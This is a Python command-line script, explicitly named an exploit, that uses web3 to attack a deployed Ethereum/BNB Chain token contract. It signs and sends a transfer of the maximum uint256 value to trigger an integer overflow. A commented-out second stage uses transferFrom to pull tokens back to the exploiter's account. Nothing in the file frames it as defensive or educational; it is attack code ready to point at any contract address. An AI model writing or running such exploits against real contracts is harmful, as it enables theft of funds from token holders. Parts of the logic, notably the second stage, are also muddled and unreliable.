import sys
import json
from web3 import Web3
from web3.middleware import geth_poa_middleware

def exploit_vulnerability(rpc_url, contract_address, private_key_exploiter, abi_json_file):
    """
    Attempts to exploit a potential integer overflow vulnerability in the transfer function.

    Args:
        rpc_url (str): The URL of the Ethereum/BNB Chain RPC provider.
        contract_address (str): The address of the deployed contract.
        private_key_exploiter (str): The private key of the exploiter account.
        abi_json_file (str): The path to the JSON file containing the contract's ABI.
    """
    w3 = Web3(Web3.HTTPProvider(rpc_url))
    if rpc_url.lower().startswith("http"):
        w3.middleware_onion.inject(geth_poa_middleware, layer=0)

    try:
        with open(abi_json_file, 'r') as f:
            abi = json.load(f)
        contract = w3.eth.contract(address=contract_address, abi=abi)
        exploiter_account = w3.eth.account.from_key(private_key_exploiter).address
        target_account = w3.eth.accounts[2] if len(w3.eth.accounts) > 2 else w3.eth.account.create().address

        print(f"Exploiter Account: {exploiter_account}")
        print(f"Contract Address: {contract_address}")
        print(f"Target Account: {target_account}")

        # Attempt to trigger integer overflow by sending a very large amount
        # that, when subtracted, might wrap around.
        # This assumes the vulnerability lies in a lack of proper overflow checks.
        # We'll try sending the maximum uint256 value.
        large_amount = 2**256 - 1

        print(f"Attempting to transfer the maximum uint256 value ({large_amount}) to trigger potential overflow...")
        tx = contract.functions.transfer(target_account, large_amount).build_transaction({
            'from': exploiter_account,
            'nonce': w3.eth.get_transaction_count(exploiter_account),
            'gasPrice': w3.eth.gas_price,
            'gas': 200000,  # Increase gas limit to be safe
        })
        signed_tx = w3.eth.account.sign_transaction(tx, private_key_exploiter)
        tx_hash = w3.eth.send_raw_transaction(signed_tx.rawTransaction)
        print(f"Exploit transaction sent: {tx_hash.hex()}")
        receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
        print(f"Transaction receipt: {receipt}")
        if receipt and receipt['status'] == 1:
            print("Potential overflow triggered. Check balances on the blockchain.")
        else:
            print("Transaction reverted. Overflow likely not triggered with this method or checks are in place.")

        # --- Potential Second Stage Exploit (Adapt based on your actual vulnerability) ---
        # If the first transfer caused an overflow in the target's balance,
        # you might try to transfer a small amount back to yourself to exploit it.
        #
        # if receipt and receipt['status'] == 1:
        #     small_amount = 10
        #     print(f"\nAttempting to transfer {small_amount} back from target to exploiter after potential overflow...")
        #     tx2 = contract.functions.transferFrom(target_account, exploiter_account, small_amount).build_transaction({
        #         'from': exploiter_account, # Approver needs to be the exploiter
        #         'nonce': w3.eth.get_transaction_count(exploiter_account) + 1,
        #         'gasPrice': w3.eth.gas_price,
        #         'gas': 200000,
        #     })
        #     # You might need to approve the exploiter to spend from the target first
        #     # approve_tx = contract.functions.approve(exploiter_account, small_amount).build_transaction(...)
        #     # ... send and wait for approve_tx ...
        #
        #     signed_tx2 = w3.eth.account.sign_transaction(tx2, private_key_exploiter)
        #     tx_hash2 = w3.eth.send_raw_transaction(signed_tx2.rawTransaction)
        #     print(f"Second exploit transaction sent: {tx_hash2.hex()}")
        #     receipt2 = w3.eth.wait_for_transaction_receipt(tx_hash2)
        #     print(f"Second transaction receipt: {receipt2}")
        #     if receipt2 and receipt2['status'] == 1:
        #         print("Potential exploit successful. Check balances.")
        #     else:
        #         print("Second transaction reverted or failed.")

    except FileNotFoundError:
        print(f"Error: ABI JSON file not found at {abi_json_file}")
        sys.exit(1)
    except json.JSONDecodeError:
        print(f"Error: Invalid JSON format in {abi_json_file}")
        sys.exit(1)
    except Exception as e:
        print(f"An error occurred during exploitation: {e}")

if __name__ == "__main__":
    if len(sys.argv) != 5:
        print("Usage: python exploit_script.py <rpc_url> <contract_address> <exploiter_private_key> <abi_json_file>")
        sys.exit(1)

    rpc_url = sys.argv[1]
    contract_address = sys.argv[2]
    private_key_exploiter = sys.argv[3]
    abi_json_file = sys.argv[4]

    exploit_vulnerability(rpc_url, contract_address, private_key_exploiter, abi_json_file)
